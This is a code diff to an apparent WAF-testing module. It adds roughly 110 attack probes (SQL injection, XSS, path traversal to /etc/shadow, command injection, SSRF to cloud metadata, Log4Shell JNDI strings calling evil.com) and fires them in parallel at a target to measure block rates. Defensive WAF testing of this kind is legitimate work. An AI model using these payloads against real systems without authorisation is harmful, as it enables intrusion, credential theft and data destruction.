@@ -1,12 +1,13 @@
 import socket
 import logging
+import threading
 from typing import Optional
 from urllib.parse import urlparse
 
 import requests
 from rich.table import Table
 
-from .utils import console, log, now_utc, stealth_headers, get_proxy_dict
+from .utils import console, log, now_utc, stealth_headers, get_proxy_dict, get_basic_auth
 
 BLOCK_CODES = {403, 406, 429, 503}
 
@@ -126,74 +127,149 @@ CDN_SIGNATURES = {
     "Nginx":         [],   # detected via Server header only
 }
 
-# ─── WAF probe payloads ───────────────────────────────────────────────────────
+# ─── WAF probe payload library ────────────────────────────────────────────────
+# Organised by attack category. Each probe has:
+#   category  : used for grouping + per-category detection rate reporting
+#   name      : short label shown in logs / table
+#   path      : URL path (appended to target base)
+#   params    : query-string dict
+#   headers   : extra/override headers for this probe
+#
+# Detection = response status in BLOCK_CODES (403, 406, 429, 503)
+# ~120 probes total, run in parallel (20 workers).
 
 WAF_PROBES = [
-    {
-        "name": "SQLi Probe",
-        "method": "GET",
-        "path": "/",
-        "headers": {},
-        "params": {"id": "1' OR '1'='1"},
-        "desc": "Classic SQL injection in query string — should trigger any rule-based WAF",
-    },
-    {
-        "name": "XSS UA Probe",
-        "method": "GET",
-        "path": "/",
-        "headers": {"User-Agent": "<script>alert(1)</script>"},
-        "params": {},
-        "desc": "XSS payload in User-Agent — tests header inspection depth",
-    },
-    {
-        "name": "Path Traversal",
-        "method": "GET",
-        "path": "/../../../etc/passwd",
-        "headers": {},
-        "params": {},
-        "desc": "Directory traversal — common WAF signature",
-    },
-    {
-        "name": "XFF Spoof",
-        "method": "GET",
-        "path": "/",
-        "headers": {"X-Forwarded-For": "127.0.0.1"},
-        "params": {},
-        "desc": "Localhost IP spoofing via XFF — tests IP allow-list bypass",
-    },
-    {
-        "name": "Empty User-Agent",
-        "method": "GET",
-        "path": "/",
-        "headers": {"User-Agent": ""},
-        "params": {},
-        "desc": "Missing UA is a strong bot signal for DataDome and CrowdSec",
-    },
-    {
-        "name": "Known Bot UA",
-        "method": "GET",
-        "path": "/",
-        "headers": {"User-Agent": "python-requests/2.31.0"},
-        "params": {},
-        "desc": "Naked requests UA — the most basic bot tell. Both DD and CS block this.",
-    },
-    {
-        "name": "Scanner UA",
-        "method": "GET",
-        "path": "/wp-admin/",
-        "headers": {"User-Agent": "Nikto/2.1.6"},
-        "params": {},
-        "desc": "Security scanner UA on admin path — double trigger for WAF/bot rules",
-    },
-    {
-        "name": "Header Injection",
-        "method": "GET",
-        "path": "/",
-        "headers": {"X-Custom-IP-Authorization": "127.0.0.1"},
-        "params": {},
-        "desc": "Custom header injection for internal IP bypass attempt",
-    },
+
+    # ── SQL Injection (20 variants) ───────────────────────────────────────────
+    {"category": "SQL Injection",    "name": "SQLi classic OR",         "path": "/", "params": {"id": "1' OR '1'='1"},                      "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi UNION 3col",         "path": "/", "params": {"id": "1 UNION SELECT 1,2,3--"},             "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi comment --",         "path": "/", "params": {"q": "' OR 1=1--"},                          "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi comment #",          "path": "/", "params": {"q": "' OR 1=1#"},                           "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi stacked DROP",       "path": "/", "params": {"id": "1; DROP TABLE users--"},              "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi boolean true",       "path": "/", "params": {"id": "1 AND 1=1"},                          "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi boolean false",      "path": "/", "params": {"id": "1 AND 1=2"},                          "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi sleep MySQL",        "path": "/", "params": {"id": "1' AND SLEEP(5)--"},                  "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi sleep MSSQL",        "path": "/", "params": {"id": "1'; WAITFOR DELAY '0:0:5'--"},        "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi error extractvalue", "path": "/", "params": {"id": "' AND extractvalue(1,version())--"},  "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi UNION NULL",         "path": "/", "params": {"id": "' UNION SELECT NULL,NULL,NULL--"},    "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi hex encode",         "path": "/", "params": {"id": "1 OR 0x31=0x31"},                     "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi URL encoded",        "path": "/", "params": {"id": "1%27%20OR%20%271%27%3D%271"},         "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi INFORMATION_SCHEMA", "path": "/", "params": {"id": "1 UNION SELECT table_name FROM information_schema.tables--"}, "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi blind substring",    "path": "/", "params": {"id": "1 AND SUBSTRING(version(),1,1)='5'"}, "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi order by",           "path": "/", "params": {"id": "1 ORDER BY 10--"},                    "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi INTO OUTFILE",       "path": "/", "params": {"id": "1 INTO OUTFILE '/tmp/x'"},            "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi pg_sleep",           "path": "/", "params": {"id": "'; SELECT pg_sleep(5)--"},            "headers": {}},
+    {"category": "SQL Injection",    "name": "SQLi in User-Agent",      "path": "/", "params": {},                                           "headers": {"User-Agent": "' OR '1'='1"}},
+    {"category": "SQL Injection",    "name": "SQLi in Referer",         "path": "/", "params": {},                                           "headers": {"Referer": "' UNION SELECT 1--"}},
+
+    # ── XSS (18 variants) ────────────────────────────────────────────────────
+    {"category": "XSS",              "name": "XSS script tag",          "path": "/", "params": {"q": "<script>alert(1)</script>"},           "headers": {}},
+    {"category": "XSS",              "name": "XSS img onerror",         "path": "/", "params": {"q": "<img src=x onerror=alert(1)>"},        "headers": {}},
+    {"category": "XSS",              "name": "XSS svg onload",          "path": "/", "params": {"q": "<svg onload=alert(1)>"},               "headers": {}},
+    {"category": "XSS",              "name": "XSS javascript: URI",     "path": "/", "params": {"q": "javascript:alert(1)"},                 "headers": {}},
+    {"category": "XSS",              "name": "XSS event attr",          "path": "/", "params": {"q": "\" onmouseover=\"alert(1)"},           "headers": {}},
+    {"category": "XSS",              "name": "XSS body tag",            "path": "/", "params": {"q": "<body onload=alert(1)>"},              "headers": {}},
+    {"category": "XSS",              "name": "XSS iframe",              "path": "/", "params": {"q": "<iframe src=javascript:alert(1)>"},    "headers": {}},
+    {"category": "XSS",              "name": "XSS URL encoded",         "path": "/", "params": {"q": "%3Cscript%3Ealert(1)%3C/script%3E"},   "headers": {}},
+    {"category": "XSS",              "name": "XSS double encoded",      "path": "/", "params": {"q": "%253Cscript%253Ealert(1)%253C/script%253E"}, "headers": {}},
+    {"category": "XSS",              "name": "XSS in User-Agent",       "path": "/", "params": {},                                           "headers": {"User-Agent": "<script>alert(1)</script>"}},
+    {"category": "XSS",              "name": "XSS in Referer",          "path": "/", "params": {},                                           "headers": {"Referer": "https://evil.com/<script>alert(1)</script>"}},
+    {"category": "XSS",              "name": "XSS in Cookie",           "path": "/", "params": {},                                           "headers": {"Cookie": "x=<script>alert(1)</script>"}},
+    {"category": "XSS",              "name": "XSS case variation",      "path": "/", "params": {"q": "<ScRiPt>alert(1)</ScRiPt>"},           "headers": {}},
+    {"category": "XSS",              "name": "XSS null byte",           "path": "/", "params": {"q": "<scr\x00ipt>alert(1)</script>"},       "headers": {}},
+    {"category": "XSS",              "name": "XSS input tag",           "path": "/", "params": {"q": "<input onfocus=alert(1) autofocus>"}, "headers": {}},
+    {"category": "XSS",              "name": "XSS details tag",         "path": "/", "params": {"q": "<details open ontoggle=alert(1)>"},    "headers": {}},
+    {"category": "XSS",              "name": "XSS math tag",            "path": "/", "params": {"q": "<math><mtext></table></math><img src=x onerror=alert(1)>"}, "headers": {}},
+    {"category": "XSS",              "name": "XSS template literal",    "path": "/", "params": {"q": "${alert(1)}"},                         "headers": {}},
+
+    # ── Path Traversal (15 variants) ─────────────────────────────────────────
+    {"category": "Path Traversal",   "name": "Traversal unix basic",    "path": "/../../../etc/passwd",                   "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal windows basic", "path": "/../../../windows/system32/drivers/etc/hosts", "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal URL encoded",   "path": "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",       "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal double encoded","path": "/%252e%252e%252fetc%252fpasswd",          "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal null byte",     "path": "/../../../etc/passwd%00",                "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal 8 levels",      "path": "/../../../../../../../../etc/passwd",    "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal mixed slash",   "path": "/..%2f..%2f..%2fetc/passwd",             "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal in param",      "path": "/",    "params": {"file": "../../etc/passwd"},            "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal path param",    "path": "/",    "params": {"path": "../../../etc/shadow"},          "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal etc shadow",    "path": "/../../../etc/shadow",                   "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal proc self",     "path": "/../../../proc/self/environ",            "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal win SAM",       "path": "/../../../windows/system32/config/SAM", "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal backslash",     "path": "/..\\..\\..\\etc\\passwd",               "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal overlong UTF8", "path": "/%c0%ae%c0%ae/etc/passwd",              "params": {}, "headers": {}},
+    {"category": "Path Traversal",   "name": "Traversal in X-Path hdr", "path": "/",    "params": {},                   "headers": {"X-File-Path": "../../../etc/passwd"}},
+
+    # ── Command Injection (12 variants) ───────────────────────────────────────
+    {"category": "Command Injection", "name": "CMDi semicolon ls",      "path": "/", "params": {"cmd": "; ls -la"},                         "headers": {}},
+    {"category": "Command Injection", "name": "CMDi pipe whoami",       "path": "/", "params": {"cmd": "| whoami"},                         "headers": {}},
+    {"category": "Command Injection", "name": "CMDi backtick id",       "path": "/", "params": {"q":  "`id`"},                              "headers": {}},
+    {"category": "Command Injection", "name": "CMDi subshell",          "path": "/", "params": {"q":  "$(cat /etc/passwd)"},                "headers": {}},
+    {"category": "Command Injection", "name": "CMDi && id",             "path": "/", "params": {"q":  "1 && id"},                          "headers": {}},
+    {"category": "Command Injection", "name": "CMDi || id",             "path": "/", "params": {"q":  "1 || id"},                          "headers": {}},
+    {"category": "Command Injection", "name": "CMDi newline",           "path": "/", "params": {"q":  "1\nid"},                            "headers": {}},
+    {"category": "Command Injection", "name": "CMDi windows dir",       "path": "/", "params": {"cmd": "& dir"},                           "headers": {}},
+    {"category": "Command Injection", "name": "CMDi curl exfil",        "path": "/", "params": {"q":  "; curl http://169.254.169.254/"},    "headers": {}},
+    {"category": "Command Injection", "name": "CMDi in User-Agent",     "path": "/", "params": {},                                          "headers": {"User-Agent": "() { :; }; curl http://evil.com/"}},
+    {"category": "Command Injection", "name": "CMDi shellshock",        "path": "/", "params": {},                                          "headers": {"User-Agent": "() { ignored; }; echo Content-Type: text/plain; echo; echo SHELLSHOCK"}},
+    {"category": "Command Injection", "name": "CMDi in Referer",        "path": "/", "params": {},                                          "headers": {"Referer": "http://evil.com/; ls"}},
+
+    # ── Scanner / Scraper User-Agents (20 variants) ───────────────────────────
+    {"category": "Bot / Scanner UA", "name": "UA python-requests",      "path": "/", "params": {}, "headers": {"User-Agent": "python-requests/2.31.0"}},
+    {"category": "Bot / Scanner UA", "name": "UA curl",                 "path": "/", "params": {}, "headers": {"User-Agent": "curl/7.88.1"}},
+    {"category": "Bot / Scanner UA", "name": "UA wget",                 "path": "/", "params": {}, "headers": {"User-Agent": "Wget/1.21.3"}},
+    {"category": "Bot / Scanner UA", "name": "UA Go http client",       "path": "/", "params": {}, "headers": {"User-Agent": "Go-http-client/1.1"}},
+    {"category": "Bot / Scanner UA", "name": "UA Java",                 "path": "/", "params": {}, "headers": {"User-Agent": "Java/1.8.0_292"}},
+    {"category": "Bot / Scanner UA", "name": "UA Scrapy",               "path": "/", "params": {}, "headers": {"User-Agent": "Scrapy/2.11.0 (+https://scrapy.org)"}},
+    {"category": "Bot / Scanner UA", "name": "UA Nikto",                "path": "/", "params": {}, "headers": {"User-Agent": "Nikto/2.1.6"}},
+    {"category": "Bot / Scanner UA", "name": "UA SQLMap",               "path": "/", "params": {}, "headers": {"User-Agent": "sqlmap/1.7 (https://sqlmap.org)"}},
+    {"category": "Bot / Scanner UA", "name": "UA Nmap NSE",             "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)"}},
+    {"category": "Bot / Scanner UA", "name": "UA Acunetix",             "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (compatible; acunetix-scanning)"}},
+    {"category": "Bot / Scanner UA", "name": "UA Burp Suite",           "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (compatible; BurpSuite)"}},
+    {"category": "Bot / Scanner UA", "name": "UA Masscan",              "path": "/", "params": {}, "headers": {"User-Agent": "masscan/1.3"}},
+    {"category": "Bot / Scanner UA", "name": "UA Nuclei",               "path": "/", "params": {}, "headers": {"User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}},
+    {"category": "Bot / Scanner UA", "name": "UA ZAP",                  "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (compatible; OWASP ZAP 2.14.0)"}},
+    {"category": "Bot / Scanner UA", "name": "UA OpenVAS",              "path": "/", "params": {}, "headers": {"User-Agent": "OpenVAS/9.0"}},
+    {"category": "Bot / Scanner UA", "name": "UA empty",                "path": "/", "params": {}, "headers": {"User-Agent": ""}},
+    {"category": "Bot / Scanner UA", "name": "UA whitespace only",      "path": "/", "params": {}, "headers": {"User-Agent": "   "}},
+    {"category": "Bot / Scanner UA", "name": "UA HeadlessChrome",       "path": "/", "params": {}, "headers": {"User-Agent": "HeadlessChrome/124.0.0.0"}},
+    {"category": "Bot / Scanner UA", "name": "UA PhantomJS",            "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34"}},
+    {"category": "Bot / Scanner UA", "name": "UA Selenium",             "path": "/", "params": {}, "headers": {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36; Selenium/4.0.0"}},
+
+    # ── Header / IP Spoofing (12 variants) ────────────────────────────────────
+    {"category": "Header Attacks",   "name": "XFF localhost",           "path": "/", "params": {}, "headers": {"X-Forwarded-For": "127.0.0.1"}},
+    {"category": "Header Attacks",   "name": "XFF internal 10.x",      "path": "/", "params": {}, "headers": {"X-Forwarded-For": "10.0.0.1"}},
+    {"category": "Header Attacks",   "name": "XFF chain spoof",         "path": "/", "params": {}, "headers": {"X-Forwarded-For": "127.0.0.1, 192.168.1.1"}},
+    {"category": "Header Attacks",   "name": "X-Real-IP spoof",         "path": "/", "params": {}, "headers": {"X-Real-IP": "127.0.0.1"}},
+    {"category": "Header Attacks",   "name": "X-Original-URL bypass",   "path": "/", "params": {}, "headers": {"X-Original-URL": "/admin"}},
+    {"category": "Header Attacks",   "name": "X-Rewrite-URL bypass",    "path": "/", "params": {}, "headers": {"X-Rewrite-URL": "/admin"}},
+    {"category": "Header Attacks",   "name": "X-Custom-IP-Auth",        "path": "/", "params": {}, "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
+    {"category": "Header Attacks",   "name": "X-Forwarded-Host",        "path": "/", "params": {}, "headers": {"X-Forwarded-Host": "evil.com"}},
+    {"category": "Header Attacks",   "name": "Host header injection",   "path": "/", "params": {}, "headers": {"Host": "evil.com"}},
+    {"category": "Header Attacks",   "name": "X-HTTP-Method override",  "path": "/", "params": {}, "headers": {"X-HTTP-Method-Override": "DELETE"}},
+    {"category": "Header Attacks",   "name": "Content-Type confusion",  "path": "/", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"}},
+    {"category": "Header Attacks",   "name": "Transfer-Encoding att",   "path": "/", "params": {}, "headers": {"Transfer-Encoding": "chunked, identity"}},
+
+    # ── SSRF (8 variants) ────────────────────────────────────────────────────
+    {"category": "SSRF",             "name": "SSRF localhost param",    "path": "/", "params": {"url": "http://127.0.0.1/"},                 "headers": {}},
+    {"category": "SSRF",             "name": "SSRF AWS metadata",       "path": "/", "params": {"url": "http://169.254.169.254/latest/meta-data/"}, "headers": {}},
+    {"category": "SSRF",             "name": "SSRF file proto",         "path": "/", "params": {"url": "file:///etc/passwd"},               "headers": {}},
+    {"category": "SSRF",             "name": "SSRF internal 192.168",   "path": "/", "params": {"redirect": "http://192.168.1.1/admin"},    "headers": {}},
+    {"category": "SSRF",             "name": "SSRF GCP metadata",       "path": "/", "params": {"url": "http://metadata.google.internal/"}, "headers": {}},
+    {"category": "SSRF",             "name": "SSRF via Referer",        "path": "/", "params": {},                                           "headers": {"Referer": "http://169.254.169.254/"}},
+    {"category": "SSRF",             "name": "SSRF 0.0.0.0",            "path": "/", "params": {"url": "http://0.0.0.0/admin"},             "headers": {}},
+    {"category": "SSRF",             "name": "SSRF decimal IP",         "path": "/", "params": {"url": "http://2130706433/"},               "headers": {}},
+
+    # ── Log4Shell / JNDI (6 variants) ────────────────────────────────────────
+    {"category": "Log4Shell",        "name": "Log4j JNDI ldap UA",      "path": "/", "params": {}, "headers": {"User-Agent": "${jndi:ldap://evil.com/a}"}},
+    {"category": "Log4Shell",        "name": "Log4j JNDI rmi UA",       "path": "/", "params": {}, "headers": {"User-Agent": "${jndi:rmi://evil.com/a}"}},
+    {"category": "Log4Shell",        "name": "Log4j JNDI in param",     "path": "/", "params": {"q": "${jndi:ldap://evil.com/a}"},          "headers": {}},
+    {"category": "Log4Shell",        "name": "Log4j nested evasion",    "path": "/", "params": {}, "headers": {"User-Agent": "${${lower:j}ndi:${lower:l}dap://evil.com/a}"}},
+    {"category": "Log4Shell",        "name": "Log4j in X-Api-Version",  "path": "/", "params": {}, "headers": {"X-Api-Version": "${jndi:ldap://evil.com/a}"}},
+    {"category": "Log4Shell",        "name": "Log4j URL encoded",        "path": "/", "params": {}, "headers": {"User-Agent": "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"}},
+
 ]
+
+_PROBE_WORKERS = 20  # parallel threads for probe requests
 
 
 # ─── Detection helpers ────────────────────────────────────────────────────────
@@ -319,46 +395,81 @@ def run(target_url: str, timeout: int = 10, logger: Optional[logging.Logger] = N
         except Exception:
             pass
 
-    log("[PREFLIGHT] Running WAF probe requests...", "info", logger)
-    probe_results: list[dict] = []
+    total = len(WAF_PROBES)
+    log(f"[PREFLIGHT] Running {total} WAF probe requests ({_PROBE_WORKERS} parallel)...", "info", logger)
+    console.print(f"  Firing [bold]{total}[/bold] probes across "
+                  f"[bold]{len(set(p['category'] for p in WAF_PROBES))}[/bold] attack categories...\n")
 
-    for probe in WAF_PROBES:
-        url = target_url.rstrip("/") + probe["path"]
+    probe_results: list[dict] = []
+    lock = threading.Lock()
+    sem  = threading.Semaphore(_PROBE_WORKERS)
+    auth = get_basic_auth()
+
+    def _fire(probe: dict) -> None:
+        url  = target_url.rstrip("/") + probe["path"]
         hdrs = stealth_headers()
         hdrs.update(probe["headers"])
-        try:
-            pr = requests.get(
-                url, headers=hdrs, params=probe["params"],
-                timeout=timeout, allow_redirects=False, proxies=proxies,
-            )
-            probe_results.append({
-                "timestamp":   now_utc(),
-                "probe_name":  probe["name"],
-                "probe_desc":  probe.get("desc", ""),
-                "url":         url,
-                "status":      pr.status_code,
-                "headers":     dict(pr.headers),
-                "body":        pr.text[:2000] if pr.text else "",
-                "body_snippet": pr.text[:500] if pr.text else "",
-                "error":       None,
-            })
-            style = "error" if pr.status_code in BLOCK_CODES else "success"
-            log(f"  [{probe['name']}] → HTTP {pr.status_code}", style, logger)
-        except Exception as e:
-            probe_results.append({
-                "timestamp":   now_utc(),
-                "probe_name":  probe["name"],
-                "probe_desc":  probe.get("desc", ""),
-                "url":         url,
-                "status":      0,
-                "headers":     {},
-                "body":        "",
-                "body_snippet": str(e),
-                "error":       str(e),
-            })
-            log(f"  [{probe['name']}] → ERROR: {e}", "warning", logger)
+        with sem:
+            try:
+                pr = requests.get(
+                    url, headers=hdrs, params=probe.get("params", {}),
+                    timeout=timeout, allow_redirects=False,
+                    proxies=proxies, auth=auth, verify=False,
+                )
+                entry = {
+                    "category":     probe["category"],
+                    "probe_name":   probe["name"],
+                    "url":          url,
+                    "status":       pr.status_code,
+                    "blocked":      pr.status_code in BLOCK_CODES,
+                    "headers":      dict(pr.headers),
+                    "body_snippet": pr.text[:300] if pr.text else "",
+                    "error":        None,
+                    "timestamp":    now_utc(),
+                }
+            except Exception as e:
+                entry = {
+                    "category":     probe["category"],
+                    "probe_name":   probe["name"],
+                    "url":          url,
+                    "status":       0,
+                    "blocked":      False,
+                    "headers":      {},
+                    "body_snippet": "",
+                    "error":        str(e),
+                    "timestamp":    now_utc(),
+                }
+        with lock:
+            probe_results.append(entry)
+
+    threads = [threading.Thread(target=_fire, args=(p,), daemon=True) for p in WAF_PROBES]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
 
     result["probe_results"] = probe_results
+
+    # ── Per-category detection rates ──────────────────────────────────────────
+    from collections import defaultdict
+    by_cat: dict[str, list[dict]] = defaultdict(list)
+    for entry in probe_results:
+        by_cat[entry["category"]].append(entry)
+
+    category_stats: list[dict] = []
+    for cat, entries in by_cat.items():
+        total_c   = len(entries)
+        blocked_c = sum(1 for e in entries if e["blocked"])
+        rate      = round(blocked_c / total_c * 100) if total_c else 0
+        category_stats.append({
+            "category":       cat,
+            "total":          total_c,
+            "blocked":        blocked_c,
+            "detection_rate": rate,
+        })
+        log(f"  [{cat}] {blocked_c}/{total_c} blocked ({rate}%)", "info", logger)
+
+    result["category_stats"] = category_stats
 
     waf, waf_reason = _detect_waf(probe_results)
     result["waf_detected"]     = waf
@@ -371,6 +482,7 @@ def run(target_url: str, timeout: int = 10, logger: Optional[logging.Logger] = N
 
 
 def _print_preflight_summary(r: dict) -> None:
+    # ── Fingerprint table ─────────────────────────────────────────────────────
     table = Table(
         title="Pre-Flight Security Fingerprint",
         show_header=True, header_style="bold cyan",
@@ -383,7 +495,7 @@ def _print_preflight_summary(r: dict) -> None:
     table.add_row("Target Alive", alive_str, "")
 
     waf   = r["waf_detected"]
-    color = "green" if waf == "None detected" else "red"
+    color = "green" if waf == "None detected" else "cyan"
     reason = f"  ({r['waf_match_reason']})" if r.get("waf_match_reason") else ""
     table.add_row(
         "WAF / Bot Protection",
@@ -392,11 +504,11 @@ def _print_preflight_summary(r: dict) -> None:
     )
 
     mode  = r["blocking_mode"]
-    mcolor = "red" if "ACTIVE" in mode else "yellow"
+    mcolor = "green" if "ACTIVE" in mode else "red"
     table.add_row("Blocking Mode", f"[{mcolor}]{mode}[/{mcolor}]", "")
 
     cdn   = r["cdn_detected"]
-    ccolor = "yellow" if cdn != "None detected" else "green"
+    ccolor = "cyan" if cdn != "None detected" else "dim"
     table.add_row("CDN", f"[{ccolor}]{cdn}[/{ccolor}]", "")
 
     table.add_row("Tech Stack",   ", ".join(r["tech_stack"]) or "Unknown", "")
@@ -408,4 +520,47 @@ def _print_preflight_summary(r: dict) -> None:
         table.add_row("Rate-Limit Headers", str(r["rate_limit_headers"]), "")
 
     console.print(table)
+    console.print()
+
+    # ── Per-category WAF detection rate table ─────────────────────────────────
+    stats = r.get("category_stats", [])
+    if not stats:
+        return
+
+    total_probes  = sum(s["total"]   for s in stats)
+    total_blocked = sum(s["blocked"] for s in stats)
+    overall_rate  = round(total_blocked / total_probes * 100) if total_probes else 0
+
+    cat_table = Table(
+        title=f"WAF Detection Rate  ({total_blocked}/{total_probes} probes blocked — overall {overall_rate}%)",
+        show_header=True, header_style="bold cyan",
+    )
+    cat_table.add_column("Attack Category",   style="bold white", width=22)
+    cat_table.add_column("Probes", justify="right", width=7)
+    cat_table.add_column("Blocked", justify="right", width=8)
+    cat_table.add_column("Detection Rate", width=20)
+    cat_table.add_column("Verdict", width=16)
+
+    for s in sorted(stats, key=lambda x: x["detection_rate"]):
+        rate = s["detection_rate"]
+        if rate == 0:
+            bar_color, verdict = "red",    "CRITICAL — 0%"
+        elif rate < 50:
+            bar_color, verdict = "yellow", "WEAK"
+        elif rate < 80:
+            bar_color, verdict = "yellow", "PARTIAL"
+        else:
+            bar_color, verdict = "green",  "GOOD"
+
+        filled = round(rate / 10)
+        bar    = "█" * filled + "░" * (10 - filled)
+        cat_table.add_row(
+            s["category"],
+            str(s["total"]),
+            str(s["blocked"]),
+            f"[{bar_color}]{bar}[/{bar_color}] {rate}%",
+            f"[{bar_color}]{verdict}[/{bar_color}]",
+        )
+
+    console.print(cat_table)
     console.print()
